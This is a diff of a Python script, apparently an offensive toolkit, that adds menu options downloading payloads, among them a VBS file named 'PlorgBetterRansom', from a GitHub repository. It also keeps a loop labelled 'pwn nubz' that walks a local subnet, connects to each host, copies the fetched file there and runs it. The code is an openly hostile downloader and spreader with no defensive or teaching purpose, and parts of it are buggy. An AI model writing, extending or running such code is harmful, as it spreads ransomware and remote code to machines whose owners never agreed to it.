@@ -46,16 +46,39 @@ while True:
                     urllib.request.urlretrieve(url, filename)
 
                     copied_file_path = os.path.join(defaultpath + "\\" + filename)
+                    continue
+                elif xb == "MSS":
                     
-                    # pwn nubz
-                    for i in range(1, 256):
-                        try:
-                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s.connect(p65 + str(i), (f34))
-                            shutil.copy2(filename, p65)
-                            subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
-                        except:
-                            pass
+                    print("$$$$")
+                    print("downloading MSS..")
+
+                    url = "https://github.com/kaosSec/kaosTools/raw/main/py/MSS.py"
+                    filename = defaultpath + "\\" + "MSS.py"
+                    urllib.request.urlretrieve(url, filename)
+
+                    copied_file_path = os.path.join(defaultpath + "\\" + filename)
+                    continue
+                elif xb == "PlorgBetterRansom":
+
+                    print("thats rude")
+                    print("downloading PlorgBetterRansom..")
+
+                    url = "https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/PlorgBetterRansom.vbs"
+                    filename = defaultpath + "\\" + "Plorg.vbs"
+                    urllib.request.urlretrieve(url, filename)
+
+                    copied_fule_path = os.path.join(defaultpath + "\\" + filename)
+                    continue
+
+                # pwn nubz
+                for i in range(1, 256):
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect(p65 + str(i))
+                        shutil.copy2(filename, p65)
+                        subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
+                    except:
+                        pass
                 
             elif r43 == "getmeout":
                 exit
